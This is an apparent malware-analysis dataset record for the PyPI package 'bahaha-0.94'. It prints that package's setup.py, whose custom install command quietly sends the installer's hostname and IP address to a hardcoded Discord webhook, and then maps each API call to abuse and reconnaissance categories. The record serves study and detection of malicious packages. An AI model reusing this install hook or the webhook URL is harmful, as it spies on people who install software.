[
  {
    "pyfile": "setup.py",
    "code_snippet": "import discord\nimport socket\nfrom discord import Webhook\nfrom discord import RequestsWebhookAdapter\nfrom setuptools.command.install import install\n\nclass CustomInstallCommand(install):\n    def run(self):\n        webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', adapter=RequestsWebhookAdapter()) # Initializing webhook\n        hostname=socket.gethostname()   \n        IPAddr=socket.gethostbyname(hostname)\n        webhook.send(content=f\"{hostname} | {IPAddr}\")\n        install.run(self)",
    "pattern_analysis": {
      "api_sequence": [
        "discord.Webhook.from_url",
        "socket.gethostname",
        "socket.gethostbyname",
        "discord.Webhook.send",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "discord.Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', adapter=discord.RequestsWebhookAdapter())",
        "socket.gethostname()",
        "socket.gethostbyname(hostname)",
        "discord.Webhook.send(content=f\"{hostname} | {IPAddr}\")",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "discord.Webhook.from_url",
          "id": "create_discord_webhook",
          "description": "Creates Discord webhook object from URL and session",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_object_creation"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "socket.gethostbyname",
          "id": "resolve_hostname",
          "description": "Resolves host name to IPv4 address",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "domain_resolution"
        },
        {
          "api_name": "discord.Webhook.send",
          "id": "send_discord_webhook",
          "description": "Sends message to Discord channel via webhook",
          "first_id": "third_party_platform_abuse",
          "second_id": "discord_abuse",
          "third_id": "discord_message_operations"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "from discord import Webhook\nfrom discord import RequestsWebhookAdapter\nimport socket\nfrom setuptools.command.install import install\n\nclass CustomInstallCommand(install):\n    def run(self):\n        webhook = Webhook.from_url('https://discordapp.com/api/webhooks/1022559347999518740/S1NKK1sYmqxwtblmh724P_s-xXuDA1Y6gX2DRy-yYZrCm3KsYDTKKP-RBhJcs55hDBax', adapter=RequestsWebhookAdapter())\n        hostname = socket.gethostname()\n        IPAddr = socket.gethostbyname(hostname)\n        webhook.send(content=f\"{hostname} | {IPAddr}\")\n        install.run(self)"
    }
  },
  {
    "metadata": {
      "package_name": "bahaha-0.94",
      "source_path": "/home/blue/PyPIAgent/Dataset/study/unzip_malware/bahaha-0.94/bahaha-0.94/setup.py",
      "code_hash": "fa7cd443c733726655b5ea3454fe8dc4"
    }
  }
]